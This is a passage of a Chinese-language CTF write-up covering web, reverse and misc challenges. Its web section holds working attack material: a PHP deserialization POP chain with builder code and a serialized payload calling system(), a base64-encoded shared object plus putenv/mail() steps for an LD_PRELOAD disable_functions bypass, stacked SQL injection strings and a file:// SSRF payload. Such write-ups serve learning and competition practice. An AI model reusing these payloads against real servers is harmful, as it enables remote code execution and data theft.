但具体逆的算法肯定不是这题的考点(考了我也逆不出来, python脚本倒是有一个… 所以去搜了一下有没有攻击mt_rand()的脚本. 真就有一个php_mt_seed, github上就有了. 但是做的时候这里踩了一个大坑, github上面的是低版本的脚本, 所以导致跑了一下午都没有跑出结果来. 直到晚上发现别人的blog用的明显不是一个版本的脚本! 才去找了找发现真有从未体验过的船新版本, 马上扔进虚拟机跑, 不到一分钟就出结果了. 拿着刚出来的种子生成字符串提交就行了 unserialize一直觉得反序列化真的很有意思, 就像推理一样一步一步的往下推出payload源码在这 12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(__FILE__);class A&#123; public $data; public function __destruct() &#123; $this-&gt;data-&gt;close(); &#125;&#125;class B&#123; public $cache; public function getit($key)&#123; if (isset($this-&gt;cache[$key]))&#123; return $this-&gt;cache[$key]; &#125; &#125; public function __call($method, $args) &#123; return call_user_func_array($this-&gt;getit($method), $args); &#125;&#125;class C&#123; public $evil,$arggg; public function evallll()&#123; call_user_func($this-&gt;evil,$this-&gt;arggg); &#125;&#125;unserialize($_GET[&#x27;sssssss&#x27;]); 首先call_user_func()可以执行php中的函数, 包括system(), assert()这些危险的函数 而源码里面只有在类C中的call_user_func()是可以自己给定执行的函数和所用的参数的, 变量$evil和函数evallll()也提示了危险函数就出现在类C中, 所以现在的目的就是想办法调用类C中的evallll() 反序列化的题基本离不开魔法函数, 找了一下, 这里的出现了__destruct()和__call($method, $args). 对于__destruct(), 当某个对象被销毁的时候如果存在这个方法就会调用它. 程序结束肯定会销毁呀. 而对于__call():当某个对象的一个不存在的方法被调用时, 如果__call方法存在, 则会调用__call方法, 第一个参数是所调用的那个不存在的方法名, 第二个参数是调用不存在的方法时的参数. 因为A中的__destruct()会调用$data-&gt;close(), 所以能靠这个从A进入B的__call. 再看看B中的call_user_func_array($this-&gt;getit($method), $args);其实就是call_user_func_array($this-&gt;cache[$key], $args); 做到这里我就卡住了, 因为$args并不可控, 所以一时半会想不到怎样通过B中的这个函数去进入C. 于是决定去看看call_user_func_array();的手册. 这才知道原来这个函数的第一个参数可以是一个数组,具体是这样:[对象,对象的方法], 这样就可以调用C中的evallll()了! 所以只需要有: 123456789class C中:$evil = &#x27;system()&#x27;;$arggg = cmd; # 具体就是需要执行的指令class B中:$cache[&#x27;close&#x27;] = [new C,&#x27;evallll&#x27;]class A中:$data = new B 这样就可以任意执行命令了. 至于构造payload, 利用php就能构造了.附上构造的代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass A&#123; public $data; public function make($ob) &#123; $this-&gt;data = $ob; &#125;&#125;class B&#123; public $cache; public function make($ob2) &#123; $this-&gt;cache = $ob2; &#125; public function getit($key) &#123; if (isset($this-&gt;cache[$key])) &#123; return $this-&gt;cache[$key]; &#125; &#125; public function __call($method, $args) &#123; return call_user_func_array($this-&gt;getit($method), $args); &#125;&#125;class C&#123; public $evil = &#x27;system&#x27;; public $arggg = &#x27;cat /flag&#x27;; public function evallll() &#123; call_user_func($this-&gt;evil, $this-&gt;arggg); &#125;&#125;$a = new A;$b = new B;$b-&gt;make([&#x27;close&#x27; =&gt; [new C, &#x27;evallll&#x27;]]);$a-&gt;make($b);var_dump(serialize($a)); 得到的payload为: 1?sssssss&#x3D;O:1:&quot;A&quot;:1:&#123;s:4:&quot;data&quot;;O:1:&quot;B&quot;:1:&#123;s:5:&quot;cache&quot;;a:1:&#123;s:5:&quot;close&quot;;a:2:&#123;i:0;O:1:&quot;C&quot;:2:&#123;s:4:&quot;evil&quot;;s:6:&quot;system&quot;;s:5:&quot;arggg&quot;;s:9:&quot;cat &#x2F;flag&quot;;&#125;i:1;s:7:&quot;evallll&quot;;&#125;&#125;&#125;&#125; 又一个后门这题做的时候发生了件小趣事(当然不是指前二血的大佬在/tmp下面搞事情啦.也不是指上一个大佬做完了题连so文件都没有删啦.更不是指自己做完了还忘记把flag文件给清理掉. 看了下phpinfo(), 发现能执行命令的函数都被ban掉了. 利用scandir()函数搜索网站目录.发现有tmp文件夹, 尝试上传文件发现可行. 想了想是否存在绕过disable_functions的漏洞呢?翻了翻百度, 找到一个在Github上的利用LD_PRELOAD漏洞绕过disable_functions的项目.附上链接 具体原理是利用LD_PRELOAD的特点,它可以影响程序的运行时的链接，它允许在程序运行前优先加载用户定义的动态链接库, 这样就可以覆盖正常的函数库, 调用一些被ban的函数.(有理解的不对的大佬请务必告诉我!!! 所以根据github上面的README.MD一步一步的做就行了 1. 先上传一个bypass_disablefunc_x64.so由于so文件是二进制文件, 所以上传的时候考虑先base64编码, 传上去用php自带的函数解码,下面是当时做题的payload(可能会有点长hhh 1c=var_dump(scandir(&#x27;/var/tmp&#x27;));$a=&#x27;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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA&#x27;;var_dump(file_put_contents(&#x27;/var/tmp/helloworld.so&#x27;,base64_decode($a))); 2. 利用so文件绕过被ban的函数把so文件传上去后其实可以继续传项目里的那个php的, 不过还是想试试能不能直接在payload里面实现. 其实也不难, 先设置需要执行的命令/readflag &gt; /var/tmp/K1rit0, 再设置环境变量LD_PRELOAD的值为刚刚传上去的helloworld.so, 然后调用mail(). 这个时候就会再/tmp下生成一个K1rit0, 里面就是/readflag的结果了! 所以payload为: 1c=var_dump(putenv(&quot;EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0&quot;));var_dump(putenv(&quot;LD_PRELOAD=/var/tmp/helloworld.so&quot;));var_dump(mail(&#x27; &#x27;,&#x27; &#x27;,&#x27; &#x27;,&#x27; &#x27;));var_dump(file_get_contents(&#x27;/var/tmp/K1rit0&#x27;)); babysql真的很baby, query语句直接给出来了.参考自己的另外一个坑就能做了某篇sql总结 当时想都没想直接堆叠注入了(以至于以为这题过滤都没有,其实select这些还是被过滤掉了的1&#39;;show databases;show tables # 直接爆出库名和表名了1&#39;;desc flag # 爆出字段名然后就发现特殊字符串enjoy_Sq1i11_qu3ryy 包裹ctf{}提交了 babyssrf白给白给 利用file://协议, 提示说的很清楚了就在/flag payload: ?url=file:///flag OSINTcheckin搜啊搜搜啊搜, 真的是搜出来的flag哦(按着提示搜就行了 REVERSE 因为本身就是为了拿分才做的RE, 所以wp就比较简短了(真不想写hhh 可以去看看Misaka大佬的wp 捉迷藏Ida打开文件, 随便翻了翻, 发现 根据语义手动拼回flag basic_hash我就只会F5! 还好主函数很简单, 就是要求做题人利用异或运算的特点A+B+B = A还原两个md5值,然后扔到某MD5爆破网站获得flag.把ida中的两个字符串的值手动输入到脚本中,跑脚本就完事了 1234567891011121314151617v9 = [70, -121, -115, 4, -67, 52, 126, 42, 113, 114, 79, 91, -61, -63, 6, -14]v26 = [59, -87, 103, -122, -46, -112, 104, -30, -92, 113, 125, -85, -14, 41, -24, 31]mask = 0b11111111for i in range(len(v9)): if v9[i] &lt; 0: v9[i] = abs(v9[i] ^ mask) - 1for i in range(len(v26)): if v26[i] &lt; 0: v26[i] = abs(v26[i] ^ mask) - 1input1_md5 = &#x27;&#x27;.join([hex(i ^ 0x30)[2:].zfill(2) for i in v9])input2_md5 = &#x27;&#x27;.join([hex(i ^ 0x20)[2:].zfill(2) for i in v26])print(input1_md5)print(input2_md5) 这样就拿到两个MD5了 1276b7bd348d044e1a41427f6bf3f136c21b8947a6f2b048c284515d8bd209c83f 扔进网站, 得到flag ByteCode因为爽哥说很简单, 所以我就来看看, 百度了一下ByteCode. 知道是就是一堆操作之后. 找到ByteCode和操作的对应表! 拿出纸笔! 点开计算机! 一点一点手动往回算…(手动算的感觉针不戳算完ascii码全部转成字符串就是flag了 Misc 说实话没想到Misc这么多题, 不过Misc做起来就感觉像猜谜一样, 也挺有趣的. 真·签到不亏是我最拿手的签到题.秒解flag 2333 Look_at_your_keyboard题目都说了看键盘咯. 1ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji 键盘上是怎样的就怎样的(所以做的时候觉得S是8, I是1的肯定不是我一个吧!结果是ctfisfun, 对着键盘看就能看出来了. Buddha也没啥好说的.新佛曰-&gt;base64-&gt;栅栏密码 Do you know Xp0int用记事本打开图片.用眼睛一行一行的看有没有flag搜索ctf&#123; 结果啥都没搜&#123; 就找到flag了. 似乎有个可以跑出文件中出现的字符串的脚本 close_basebase64解码发现是C语言源码 (输出不是hello,world, 差评!估计是base64隐写了, 毕竟每一行base64编码结尾都有等号, 肯定能藏很多东西2333所以base64隐写是啥?这里不写了…直接上脚本 123456789101112131415161718192021222324252627282930def bin2text(Bin): Hex = hex(int(Bin, 2))[2:] if len(Hex) % 2: Hex = &#x27;0&#x27; + Hex return &#x27;&#x27;.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])table = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;res = &#x27;&#x27;with open(&#x27;base.txt&#x27;, &#x27;r&#x27;) as f: base = f.readlines()for i in range(len(base)): base[i] = base[i][::-1][1:5][::-1]for i in base: tmp = &#x27;&#x27; for j in i: if j != &#x27;=&#x27;: o = bin(table.index(j))[2:] tmp += &#x27;0&#x27; * (6 - len(o)) + o tmp = tmp + &#x27;0&#x27; * (24 - len(res)) if &#x27;==&#x27; in i: res += tmp[8:12] elif &#x27;=&#x27; in i: res += tmp[16:18]flag = &#x27;ctf&#123;&#x27; + bin2text(res) + &#x27;&#125;&#x27;print(flag) 输出的就是flag了(具体原理真的到处都有的,找就完事了 PMGBA做的最过瘾的一题(但是被自己蠢到了 开局一张图, 文件全靠拆.说实话一开始拿到图感觉挺熟悉的, 就是记不起来这是什么…直到去百度PMGBA的意思才知道是宝可梦.这不就是我上学期练级刷的怪吗! 我也算是半年的宝可梦老玩家了(俊强才是宝可梦大师!马上跑去问俊强”上学期我刷等级刷的那个有26个形态的字母怪叫什么”‘未知图腾’ 马上去找图鉴, 对应图鉴得到字符串remember to examine the.一开始拿到这个我还以为就是想让我检查这张图片的意思(鬼知道这是flag的前半部分啊喂 扔binwalk跑了一下发现确实不止一张图片.由于被foremost坑过所以能手动分文件就手动分了. 用winhex打开图片, 对照这文件头文件尾, 分出了三张图(包括最开始的未知图腾 最开始注意到的其实是第三张图, 这是我第一个练到5v的宝可梦, 卡蒂狗!拖进Stegsolve分析没有什么结果后. 决定看看是不是LSB. 于是又把卡蒂狗扔进zsteg, 出来了一串字符串’pwd is 58growliness\\n’. 密码是58growliness? 不知道这个密码是个啥直到从第二张图里分出段base64, 解码后发现是个加密的压缩包. 密码就是58growliness 里面一个txt, 内容全是pi ka chu的组合 1pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... 后面还有很多 猜测是某种加密, 但是却搜不到.但后面找到一篇大概讲的是用皮卡丘语编程的文章, 大概内容就是套用brainfuck的语法来编程. 所以来试试看是不是brainfuck. 根据字符出现的频率自己强行脑部回了对应表(dalao说github上有! 123456789dit=&#123; &#x27;pi&#x27;:&#x27;+&#x27;, &#x27;ka&#x27;:&#x27;-&#x27;, &#x27;chu&#x27;:&#x27;]&#x27;, &#x27;pika&#x27;:&#x27;[&#x27;, &#x27;pipi&#x27;:&#x27;&gt;&#x27;, &#x27;pichu&#x27;:&#x27;&lt;&#x27;, &#x27;pikachu&#x27;:&#x27;.&#x27;, &#125; 还原回brainfuck代码后运行得到的结果为foo bar 事实上拼接前面的remember to examine the foo bar 就是flag了.但我却没有想到…(谁想的到啊所以一直卡着不知道flag是啥.直到周一马克思课想着随便试一下, 才提交成功…(correct出来的时候人都傻了..还是脑洞不够大吗 集齐五龙珠一大堆的文件, 名字全都是base64. 想看看全部解码会不会有什么线索.写了个脚本来解码 123456789import osfrom base64 import b64decodebase = &#x27;problem/&#x27;filenames = []for root, ds, fs in os.walk(base): for f in fs: print(f, b64decode(f).decode(&#x27;utf-8&#x27;, &#x27;ignore&#x27;)) # 输出文件名和解码之后的文件名 果然里面有五个很特殊的文件, 解码之后是正常的字符串.就是后缀带one的文件(其他的是后面解题的文件 winhex打开first_one和last!_one 发现似乎是一个压缩包被拆成五份了.尝试还原回去, 但是不知道中间三个压缩包的顺序. 于是写了个脚本来手动尝试(因为就3个文件就8种组合, 自己调换顺序就行了. 